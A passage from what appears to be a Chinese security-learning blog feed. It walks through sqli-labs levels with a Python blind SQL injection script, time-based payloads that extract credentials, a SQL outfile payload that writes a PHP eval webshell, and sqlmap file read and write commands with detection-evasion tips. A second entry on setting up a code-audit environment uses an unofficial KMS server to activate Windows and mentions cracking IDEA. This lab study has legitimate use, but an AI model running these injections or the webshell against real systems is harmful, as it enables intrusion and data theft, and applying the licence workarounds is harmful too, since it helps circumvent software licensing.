database()))=<span class="subst">&#123;length&#125;</span>&quot;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> payload_test(payload):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name_length</span>():</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># 假设名字长度最多为50</span></span><br><span class="line">        payload = <span class="string">f&quot;LENGTH((SELECT group_concat(table_name) \</span></span><br><span class="line"><span class="string">        from information_schema.tables \</span></span><br><span class="line"><span class="string">        where table_schema = database()))=<span class="subst">&#123;length&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> payload_test(payload):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_column_name_length</span>():</span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):  <span class="comment"># 假设名字长度最多为50</span></span><br><span class="line">        payload = <span class="string">f&quot;LENGTH((SELECT group_concat(column_name) \</span></span><br><span class="line"><span class="string">        from information_schema.columns \</span></span><br><span class="line"><span class="string">        where table_schema = database() and table_name=&#x27;user&#x27;))=<span class="subst">&#123;length&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> payload_test(payload):</span><br><span class="line">            <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;def get_dump_length():</span></span><br><span class="line"><span class="string">    for length in range(1,50):</span></span><br><span class="line"><span class="string">        payload=f&quot;LEGTH((SELECT group_concat(username, &#x27;~&#x27;, password) from users))=&#123;length&#125;&quot;</span></span><br><span class="line"><span class="string">        if payload_test(payload):</span></span><br><span class="line"><span class="string">            return length&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_ascii</span>(<span class="params">length</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">        ptyload = <span class="string">f&quot;ascii()&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sqli_exploit</span>():</span><br><span class="line">    database_length = get_database_length()</span><br><span class="line">    <span class="comment">#table_length = get_table_name_length()</span></span><br><span class="line">    <span class="comment">#column_length = get_column_name_length()</span></span><br><span class="line">    <span class="comment">#dump_length = get_dump_length()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;database length:&quot;</span>, database_length)</span><br><span class="line">    <span class="comment">#print(&quot;table length:&quot;, table_length)</span></span><br><span class="line">    <span class="comment">#print(&quot;column length:&quot;, column_length)</span></span><br><span class="line">    <span class="comment">#print(&quot;dummp length:&quot;, dump_length)</span></span><br><span class="line">    alphabet = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">127</span>)]  <span class="comment"># 可能的字符集合</span></span><br><span class="line">    extracted_data = <span class="string">&quot;&quot;</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, database_length + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># for char in alphabet:</span></span><br><span class="line">        <span class="comment">#     payload = f&quot;ASCII(SUBSTR((SELECT database()),&#123;i&#125;,1))=&#x27;&#123;char&#125;&#x27;&quot;</span></span><br><span class="line">        <span class="comment">#     if (payload_test(payload)):</span></span><br><span class="line">        <span class="comment">#         extracted_data += chr(char)</span></span><br><span class="line">        <span class="comment">#         print(&quot;已完成字符:&quot;, extracted_data)</span></span><br><span class="line">        <span class="comment">#         break</span></span><br><span class="line">        left = <span class="number">30</span></span><br><span class="line">        right = <span class="number">130</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">            payload = <span class="string">f&quot;ASCII(SUBSTR((SELECT database()),<span class="subst">&#123;i&#125;</span>,1)) &gt; &#x27;<span class="subst">&#123;mid&#125;</span>&#x27;&quot;</span></span><br><span class="line">            payload2 = <span class="string">f&quot;ASCII(SUBSTR((SELECT database()),<span class="subst">&#123;i&#125;</span>,1)) = &#x27;<span class="subst">&#123;mid&#125;</span>&#x27;&quot;</span></span><br><span class="line">            <span class="keyword">if</span> payload_test(payload) == <span class="literal">True</span>:</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">if</span> payload_test(payload2) == <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        result += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;最终结果:&quot;</span>, extracted_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;最终结果:&quot;</span>, result)</span><br><span class="line"><span class="comment"># def Binary_ascii(idx,left,right):</span></span><br><span class="line"><span class="comment">#     result = &quot;&quot;</span></span><br><span class="line"><span class="comment">#     while left &lt;= right:</span></span><br><span class="line"><span class="comment">#         mid = (left + right) &gt;&gt; 1</span></span><br><span class="line"><span class="comment">#         payload = f&quot;ASCII(SUBSTR((SELECT database()),&#123;idx&#125;,1)) &gt; &#x27;&#123;mid&#125;&#x27;&quot;</span></span><br><span class="line"><span class="comment">#         if payload_test(payload) == True:</span></span><br><span class="line"><span class="comment">#             result += chr(mid)</span></span><br><span class="line"><span class="comment">#         else:</span></span><br><span class="line"><span class="comment">#             right = mid - 1</span></span><br><span class="line"><span class="comment">#     return result</span></span><br><span class="line">blind_sqli_exploit()</span><br></pre></td></tr></table></figure><h3 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h3><p>就是把第五关的payload的单引号改成双引号</p><p><img src="/../image/image-20240821152941814.png" alt="image-20240821152941814"></p><h3 id="Less-7-Dump-into-outfile-String"><a href="#Less-7-Dump-into-outfile-String" class="headerlink" title="Less-7 Dump into outfile - String"></a>Less-7 Dump into outfile - String</h3><p>详细介绍：outfile<a href="https://blog.csdn.net/weixin_44377973/article/details/109265546">https://blog.csdn.net/weixin_44377973/article/details/109265546</a></p><p><img src="/../image/image-20240821153207000.png" alt="image-20240821153207000"></p><p>这一关也能用布尔盲注，但题目要求用outfile，</p><p>首先往mysql的配置文件<code>my.ini</code>中加入<code>secure_file_priv=&quot;/&quot;</code></p><p><img src="/../image/image-20240821153811254.png" alt="image-20240821153811254"></p><p>然后往修改php的配置文件<code>php.ini</code>保证<code>magic_quotes_gpc = Off</code></p><p><a href="https://blog.csdn.net/qq_41173457/article/details/81268894">https://blog.csdn.net/qq_41173457/article/details/81268894</a></p><p>如果是On的话，我们的文件路径的&#x2F;等符号就要进行转义了</p><p><img src="/../image/image-20240821153720444.png" alt="image-20240821153720444"></p><p>设置完我们可以查看一下有没有生效</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;%secure_file_priv%&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240821184736837.png" alt="image-20240821184736837"></p><p>我们保存的文件可以在C盘的根目录下</p><p>我们先测试一下闭合方式，<em>当我们输入id&#x3D;1’时显示报错，但是没有报错信息，这和我们之前的关卡不一样，之前都有报错信息。当我们输入id&#x3D;1”时显示正常所以我们可以断定参数id时单引号字符串。因为单引号破坏了他原有语法结构。然后我输入id&#x3D;1’–+时报错，这时候我们可以输入id&#x3D;1’)–+发现依然报错，之时我试试是不是双括号输入id&#x3D;1’))–+，发现页面显示正常。</em>这是攻略中的思路,有了闭合方式，我们就可以尝试写文件了，要绝对路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)) union select 1,database(),3 into outfile &quot;C:/phpstudy_pro/WWW/sql/Less-7/info.txt&quot; --+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240821195702361.png" alt="image-20240821195702361"></p><p>既然能写文件，我们可以来尝试下能不能下木马文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)) union select 1,2,&#x27;&lt;?php @eval($_POST[&quot;a&quot;]);?&gt;&#x27; into outfile &#x27;C:/phpstudy_pro/WWW/sql/Less-7/shell.php&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240821200528294.png" alt="image-20240821200528294"></p><p>其它方法<a href="https://www.cnblogs.com/ersuani/p/13887938.html%EF%BC%8C%E8%BF%9E%E6%8E%A5%E4%B8%80%E4%B8%8B">https://www.cnblogs.com/ersuani/p/13887938.html，连接一下</a></p><p><img src="/../image/image-20240821200617870.png" alt="image-20240821200617870"></p><p>sqlmap也有写文件的功能，先判断是否有注入点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.142/sql/Less-7/?id=1&quot; --batch</span><br></pre></td></tr></table></figure><p>然后判断是否是root用户</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.142/sql/Less-7/?id=1&quot; --batch --is-dba</span><br></pre></td></tr></table></figure><p>如果是最高权限的话，我们可以进行文件下载，文件上传等等的操作，不是的话就爆库爆表。</p><p><img src="/../image/image-20240821201014820.png" alt="image-20240821201014820"></p><p>这里是root权限，我们试试文件读取下载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.142/sql/Less-7/?id=1&quot; --batch --file-read &quot;c://phpstudy_pro//WWW//sql//Less-7//info.txt&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240821201248971.png" alt="image-20240821201248971"></p><p>看来要改下保存文件的路径了</p><p><img src="/../image/image-20240821201319770.png" alt="image-20240821201319770"></p><p>还可以试试文件上传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.142/sql/Less-7/?id=1&quot;  --file-write &quot;C:/Users/yxz/Desktop/sqlmap/1.txt&quot; --file-dest &quot;C:\phpstudy_pro\WWW\sql\Less-7\info.txt&quot; -v1 --technique B</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240821201717648.png" alt="image-20240821201717648"></p><p>应该是权限问题，没有写进去，原理就是利用下面两个函数</p><p><strong>outfile</strong> 函数：可写多行，数据格式可能会受操作系统影响</p><p><strong>dumpfile</strong> 函数：可写单行，数据格式不会受操作系统影响</p><h3 id="Less-8-布尔盲注单引号"><a href="#Less-8-布尔盲注单引号" class="headerlink" title="Less-8 布尔盲注单引号"></a>Less-8 布尔盲注单引号</h3><p>和第五关差不多，就不多说了</p><h3 id="Less-9-时间盲注"><a href="#Less-9-时间盲注" class="headerlink" title="Less-9 时间盲注"></a>Less-9 时间盲注</h3><p>这里你会发现输入什么都会返回You are in…这样，我们就需要通过时间盲注的方法来注入，先简单介绍下原理，if(a,sleep(10),1)如果a结果是真的，那么执行sleep(10)页面延迟10秒，如果a的结果是假，执行1，页面不延迟。通过页面时间来判断出id参数是单引号字符串。有了这个判断再结合上布尔盲注就可以了,这里不判断闭合类型是因为题目提示了单引号。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(1=1,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>这个截图不好反应变化，可以看看F12里的网络里的时间，我这里选择抓包看看时间来测试</p><p><img src="/../image/image-20240822152519031.png" alt="image-20240822152519031"></p><p>下面试试正常的包的响应时间</p><p><img src="/../image/image-20240822152548071.png" alt="image-20240822152548071"></p><p>有了这个区别，我们就可以把if里面的条件换成布尔盲注的payload，来注入</p><p>判断数据库名长度</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;9,sleep(5),1)--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))=115,sleep(5),1)--+</span><br><span class="line">逐一判断数据库字符</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断表名</span><br><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名。</span><br><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容。</span><br></pre></td></tr></table></figure><p>这个手工测试也是比较累人的，还是用sqlmap跑把</p><p><img src="/../image/image-20240822153005579.png" alt="image-20240822153005579"></p><p>可以看到sqlmap检测出有布尔和时间两种注入，我们这里通过technique来指定时间注入的模式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.142/sql/Less-9/?id=1&quot; --batch -dbs --technique T</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240822160500296.png" alt="image-20240822160500296"></p><p>我们还可以通过设置–time-sec参数来控制时间，有时候不能太快，我们要调慢点，虽然等的久，但是不容易被发现，结合上<code>-random-agent</code> 随机ua降低风险</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.174.142/sql/Less-9/?id=1&quot; --batch -dbs --technique T --time-sec 3 -random-agent</span><br></pre></td></tr></table></figure><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>第十关和第九关一样只需要将单引号换成双引号。</p><h3 id="Less-11-Base-error-单引号"><a href="#Less-11-Base-error-单引号" class="headerlink" title="Less-11 Base error-单引号"></a>Less-11 Base error-单引号</h3><p><img src="/../image/image-20240822162713174.png" alt="image-20240822162713174"></p><p>可以发现，我们的页面都变了，有了个登入框，在介绍报错注入前，先介绍一个万能账号把</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240822162807152.png" alt="image-20240822162807152"></p><p>当我们输入这个账号，能直接登入成功，算是登录框注入的一个，我们先按联合注入的方式，测试一下</p><p><img src="/../image/image-20240822163043197.png" alt="image-20240822163043197"></p><p>我们可以猜测语句中有username&#x3D;xx and password &#x3D;xx，然后就是测试字段，走流程即可，这里的语句最后不能用 –了要用#</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 #</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240822163402308.png" alt="image-20240822163402308"></p><p>剩下的就参考前面的来联合注入即可</p><h3 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> sql </tag>
            
            <tag> sqli-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从0.1开始的代码审计</title>
      <link href="/2024/08/16/%E4%BB%8E0-1%E5%BC%80%E5%A7%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/08/16/%E4%BB%8E0-1%E5%BC%80%E5%A7%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="代码审计环境篇"><a href="#代码审计环境篇" class="headerlink" title="代码审计环境篇"></a>代码审计环境篇</h1><p>在我学习代码审计时，老是版本不对，少了依赖。为了捋清楚这个，决定按Java代码审计（入门篇）来配置一下环境，属于傻瓜式教学。</p><h2 id="win10虚拟机"><a href="#win10虚拟机" class="headerlink" title="win10虚拟机"></a>win10虚拟机</h2><p>看这篇教程：<a href="https://blog.csdn.net/lvlheike/article/details/120398259">https://blog.csdn.net/lvlheike/article/details/120398259</a></p><p>1.打开VMware16，点击创建新的虚拟机</p><p><img src="/../image/image-20240816225505769.png" alt="image-20240816225505769"></p><p>2.默认即可</p><p><img src="/../image/image-20240816225602034.png" alt="image-20240816225602034"></p><ol start="3"><li>等等用iso</li></ol><p><img src="/../image/image-20240816225811872.png" alt="image-20240816225811872"></p><p>4.选择对应的版本</p><p><img src="/../image/image-20240816231116917.png" alt="image-20240816231116917"></p><ol start="5"><li>别放C盘</li></ol><p><img src="/../image/image-20240816232119177.png" alt="image-20240816232119177"></p><p>6.BIOS即可</p><p><img src="/../image/image-20240816232242144.png" alt="image-20240816232242144"></p><p>7.看自己配置给，设备管理器看一下就行</p><p><img src="/../image/image-20240816232446587.png" alt="image-20240816232446587"></p><p>8.设置内存，我这里给4G</p><p><img src="/../image/image-20240816234107549.png" alt="image-20240816234107549"></p><p>9.网络选NAT即可</p><p><img src="/../image/image-20240816234051389.png" alt="image-20240816234051389"></p><p>10.IO控制器，默认即可</p><p><img src="/../image/image-20240816234131760.png" alt="image-20240816234131760"></p><p>11.储蓄协议选SCSI</p><p><img src="/../image/image-20240816234221413.png" alt="image-20240816234221413"></p><p>12.创建一个新的磁盘</p><p><img src="/../image/image-20240816234255365.png" alt="image-20240816234255365"></p><p>13.磁盘尽量给大一点，单个文件初期方便管理，我这里只是做代码审计的环境，就不多给了，用建议大小就是了</p><p><img src="/../image/image-20240816234358227.png" alt="image-20240816234358227"></p><p>14.默认即可，下一步</p><p><img src="/../image/image-20240816234447671.png" alt="image-20240816234447671"></p><p>15.自定义硬件，删去不用的打印机，然后在CD里选择刚刚下载的镜像</p><p><img src="/../image/image-20240816234547392.png" alt="image-20240816234547392"></p><p><img src="/../image/image-20240816234621970.png" alt="image-20240816234621970"></p><p>到这里基本就准备好了，下面进入系统的配置</p><p>16.选择好语言下一步</p><p><img src="/../image/image-20240816234731956.png" alt="image-20240816234731956"></p><p>17.现在安装</p><p><img src="/../image/image-20240816234753329.png" alt="image-20240816234753329"></p><p>18.密钥我不推荐在这里写，除非你的密钥百分百没有问题。所以我这里先跳过，选择没有产品密钥，等等自己破解</p><p><img src="/../image/image-20240816234921397.png" alt="image-20240816234921397"></p><p>19.选择自己想要的版本，然后下一步。</p><p><img src="/../image/image-20240816235144208.png" alt="image-20240816235144208"></p><p>20.选择自定义安装。</p><p><img src="/../image/image-20240816235237184.png" alt="image-20240816235237184"></p><p>21.选择磁盘，然后下一步。</p><p><img src="/../image/image-20240816235315779.png" alt="image-20240816235315779"></p><p>22.等待安装即可，这里时间会有点长。</p><p><img src="/../image/image-20240816235812779.png" alt="image-20240816235812779"></p><p>23.按正常思路选即可，就不截图了，如果有特别需要再截出来</p><p><img src="/../image/image-20240817000029323.png" alt="image-20240817000029323"></p><p><img src="/../image/image-20240817000413150.png" alt="image-20240817000413150"></p><p>这里看自己的想法，不想添加也可以</p><p><img src="/../image/image-20240817000457603.png" alt="image-20240817000457603"></p><p><img src="/../image/image-20240817000701263.png" alt="image-20240817000701263"></p><p><img src="/../image/image-20240817000724230.png" alt="image-20240817000724230"></p><p><img src="/../image/image-20240817000803476.png" alt="image-20240817000803476"></p><p><img src="/../image/image-20240817000855084.png" alt="image-20240817000855084"></p><p><img src="/../image/image-20240817000908381.png" alt="image-20240817000908381"></p><p><img src="/../image/image-20240817001118883.png" alt="image-20240817001118883"></p><p>现在来安装vmtools，不然移动文件什么的太难受了</p><p><img src="/../image/image-20240817001250392.png" alt="image-20240817001250392"></p><p><img src="/../image/image-20240817001408291.png" alt="image-20240817001408291"></p><p>在分辨率自动调整好后，重启虚拟机，然后破解一下即可</p><p>先断开网络，转到设置&gt;系统&gt;关于&gt;更改产品密钥或升级。</p><p><img src="/../image/image-20240817001813420.png" alt="image-20240817001813420"></p><p><img src="/../image/image-20240817001703953.png" alt="image-20240817001703953"></p><p>输入Windows 10 Pro通用的专业密钥。（这是不会激活的合法密钥，家庭升级专业版用）<br>VK7JG-NPHTM-C97JM-9MPGT-3V66T</p><p><img src="/../image/image-20240817001851872.png" alt="image-20240817001851872"></p><p><img src="/../image/image-20240817001859201.png" alt="image-20240817001859201"></p><p>等待即可</p><p><img src="/../image/image-20240817001935223.png" alt="image-20240817001935223"></p><p>出现这种问题，我们还有另一种方法，命令行操作，这里不懂为什么不行</p><ol><li>首先，以管理员身份进入cmd命令行</li></ol><p><img src="/../image/image-20240817002057908.png" alt="image-20240817002057908"></p><p>2.输入命令slmgr &#x2F;ipk W269N-WFGWX-YVC9B-4J6C9-T83GX ！！！<br>注意，这里一定要等到弹窗出现（弹窗有时候需要等一会儿再出现），<br>点击确定之后，才能进行下一步操作</p><p><img src="/../image/image-20240817002114727.png" alt="image-20240817002114727"></p><ol start="3"><li>输入命令slmgr &#x2F;skms kms.loli.best ！！！注意，这里一定要等到弹窗出现（弹窗有时候需要等一会儿再出现），点击确定之后，才能进行下一步操作</li></ol><p><img src="/../image/image-20240817002340199.png" alt="image-20240817002340199"></p><ol start="4"><li>输入命令slmgr &#x2F;ato，弹出弹窗成功激活即激活成功！</li></ol><p><img src="/../image/image-20240817002426666.png" alt="image-20240817002426666"></p><p><img src="/../image/image-20240817002451884.png" alt="image-20240817002451884"></p><p>到这里就彻底结束了</p><h2 id="java环境配置"><a href="#java环境配置" class="headerlink" title="java环境配置"></a>java环境配置</h2><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>这里用java8u202的版本测试，估计之后还要切别的版本</p><p><img src="/../image/image-20240817005929498.png" alt="image-20240817005929498"></p><p>下载后移动到虚拟机里，刚装的机子就是干净</p><p><img src="/../image/image-20240817010506915.png" alt="image-20240817010506915"></p><p>启动安装，一直下一步就好，虚拟机就一个盘，没什么讲究</p><p><img src="/../image/image-20240817010530454.png" alt="image-20240817010530454"></p><p><img src="/../image/image-20240817010709966.png" alt="image-20240817010709966"></p><p>安装好了，下面就是配置环境变量</p><p><img src="/../image/image-20240817113442770.png" alt="image-20240817113442770"></p><p>自动安装的话，会给我们自己配一个环境变量，我们最好重新配一个<a href="https://www.runoob.com/w3cnote/the-different-of-jre-and-jdk.html">JRE 与 JDK的区别</a>,jre比jdk更轻，提供给仅仅是想运行java程序的人，没有开发的环境那么</p><p>在系统变量中新建一个名为“JAVA_HOME”的变量，且变量值为刚才安装 JDK 时所保存的路径，此处为“ C:\Program Files\Java\jdk1.8.0_202，这里最后有没有\好像是有区别的，如果配错了，这也是一个排查点</p><p><img src="/../image/image-20240817113720721.png" alt="image-20240817113720721"></p><p>在系统变量中单击“Path”，再单击“编辑”按钮，在弹出的对话框中添加变量值“;%JAVA_HOME%\bin;%Java_HOME%\jre\bin”，然后单击<br>“确定”按钮。</p><p><img src="/../image/image-20240817114842696.png" alt="image-20240817114842696"></p><p>  在系统变量中新建一个名为“CLASSPATH”的变量，其变量值为“.;%Java_HOME%\lib;%JAVA_HOME%\lib\tools.jar”  <a href="https://www.jianshu.com/p/1054dd51d6e7">全安装java之后,找不到tools.jar和dt.jar</a></p><p><img src="/../image/image-20240817115154285.png" alt="image-20240817115154285"></p><p>最后运行可能出现的问题</p><h3 id="java-version可以javac不是内部命令"><a href="#java-version可以javac不是内部命令" class="headerlink" title="java -version可以javac不是内部命令"></a>java -version可以javac不是内部命令</h3><p><img src="/../image/image-20240817120554922.png" alt="image-20240817120554922"></p><p>其实就是cmd启动的时候javac的环境还没配置好，没读取到，重新启动下cmd好像就可以，但中间也做了下修改</p><p><img src="/../image/image-20240817121359346.png" alt="image-20240817121359346"></p><p>别以到最顶上，不然path可能会变成一行那种，不是很好看，最好让system32在最头上</p><p><img src="/../image/image-20240817121330877.png" alt="image-20240817121330877"></p><p>可以关机打个快照，但为了节省内存，我这里就没打了。</p><h2 id="win10-Docker"><a href="#win10-Docker" class="headerlink" title="win10-Docker"></a>win10-Docker</h2><p>安装docker主要是为了拉取不同的漏洞环境，用docker拉去比较方便<a href="https://www.docker.com/products/docker-desktop/">https://www.docker.com/products/docker-desktop/</a></p><p><img src="/../image/image-20240817122108960.png" alt="image-20240817122108960"></p><p>但这里安的虚拟机版本不够，不是pro或企业版，我服了，反正是为了调试，kali之前安过了，这里就不安了。。。</p><p><a href="https://blog.csdn.net/weixin_44818729/article/details/105747134%EF%BC%8C%E6%8E%A8%E8%8D%90%E4%B8%80%E4%B8%AA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%EF%BC%8C%E9%99%A4%E4%BA%86%E5%8D%87%E7%BA%A7windows%E5%A4%96%EF%BC%8C%E8%B7%B3%E8%BF%87%E8%BF%99%E8%BF%99%E4%B8%AA%EF%BC%8C%E6%9D%A5%E5%AE%89%E8%A3%85JETbrain%E6%8A%8A">https://blog.csdn.net/weixin_44818729/article/details/105747134，推荐一个解决方案，除了升级windows外，跳过这这个，来安装JETbrain把</a></p><h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><p><img src="/../image/image-20240817131605487.png" alt="image-20240817131605487"></p><p>至于pycharm和phpstorm就不在虚拟机里装了，外面的python环境和php环境还是容易一点的 ，其实是不想再装了。。。</p><p>破解一下</p><p><img src="/../image/image-20240817134441908.png" alt="image-20240817134441908"></p><h1 id="远程调试测试"><a href="#远程调试测试" class="headerlink" title="远程调试测试"></a>远程调试测试</h1><p><a href="https://segmentfault.com/a/1190000040469952">https://segmentfault.com/a/1190000040469952</a></p><h2 id="对-Jar-包进行远程调试"><a href="#对-Jar-包进行远程调试" class="headerlink" title="对 Jar 包进行远程调试"></a>对 Jar 包进行远程调试</h2><p>以冰蝎3.0为例</p><p>创建一个空项目即可，然后配置下项目结构</p><p><img src="/../image/image-20240817145146245.png" alt="image-20240817145146245"></p><p>创建一个 lib 文件夹将 Jar 包放入。选中 lib 文件夹后，右键选择“Add as Library…”，将 lib 文件夹添加进项目依赖。成功添加后可以看到 Jar 包中反编译后的源代码。</p><p>  <img src="/../image/image-20240817145411230.png" alt="image-20240817145411230"></p><p><img src="/../image/image-20240817145503779.png" alt="image-20240817145503779"></p><p>通过右上角的“Add Configurations”，并单击“+”来添加一个“Remote”。默认配置界面如图 2-36 示，单击“Apply”提交并保存即可。其中<br>“-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005”将作为运行时的启动参数。  基本上就是默认即可</p><p><img src="/../image/image-20240817145733682.png" alt="image-20240817145733682"></p><p>将“-agentlib:jdwp&#x3D;transport&#x3D;dt_socket,server&#x3D;y,suspend&#x3D;n,address&#x3D;5005”作为启动参数运行 Jar 包，如图 2-37 所示。 suspend 表示是否暂停程序等待调试器的连接，“y”表示暂停， “n”表示不暂停。建议选择暂停，避免程序执行过快导致一些断点无法拦截程序  </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 Behinder.jar</span><br></pre></td></tr></table></figure><p>调试器和被调试 JVM 在启动的时候, 都需要通过设置 JVM 参数来让它具有调试的能力或者可被调试的能力。</p><p>对于 JDK5 及以上的版本，参数格式为：<code>-agentlib:jdwp=&#123;子配置项&#125;</code></p><p>对于 JDK5 以前的版本，参数格式为：<code>-Xdebug</code> 以及 <code>-Xrunjdwp:&#123;子配置项&#125;</code>。</p><p>而子配置项，包括：</p><ol><li>transport：数据交换方式，可选：<code>dt_socket</code> 和 <code>dt_shmem</code>，分别代表 socket 网络通信和共享内存通信</li><li>Address：标识一个对端的地址，格式为：<code>&#123;ip&#125;:&#123;port&#125;</code></li><li>server：标识自己是调试者还是被调试者，调试者配置为：<code>n</code>，被调试着配置为：<code>y</code></li><li>suspend：只有被调试者才需要配这个参数，当配置为 <code>y</code> 的时候，代表等待调试者连接上来才真正启动 Java 应用；配置为 <code>n</code> 时，则直接启动 Java 应用。</li></ol><blockquote><p>这里的 Java 应用，是相对于 JVM 来说的，假如把 JVM 看成一个平台，那我们写的代码就是一个 Java 应用。JVM 已经启动，但我们的应用代码还没有跑起来，这种情况在上文的语境中，我们叫做 Java 应用还没启动。</p></blockquote><p>配置示例：</p><ol><li><p>被调试者开启远程调试监听：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,address=localhost:7007,server=y,<span class="built_in">suspend</span>=y</span><br></pre></td></tr></table></figure></li><li><p>被调试者开启本地共享内存调试监听：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_shmem,server=y,<span class="built_in">suspend</span>=n</span><br></pre></td></tr></table></figure></li><li><p>调试者远程连接被调试者：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,address=localhost:7007,server=n,<span class="built_in">suspend</span>=y</span><br></pre></td></tr></table></figure></li><li><p>调试者基于共享内存方式连接被调试者：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_shmem, 